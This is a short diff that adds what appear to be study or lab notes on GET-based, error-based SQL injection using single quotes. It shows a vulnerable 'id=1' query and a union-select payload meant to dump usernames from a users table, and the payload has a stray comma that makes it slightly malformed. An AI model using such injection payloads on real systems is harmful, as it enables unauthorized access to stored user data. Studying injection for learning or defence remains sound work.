@@ -1,0 +1,10 @@
+GET ERROR-BASED[single quotes]
+
+query used
+Select * from TABLE where id=1;
+
+
+
+
+to dump the database
+id=1' union select, group_concat(username),3 from users;-- 
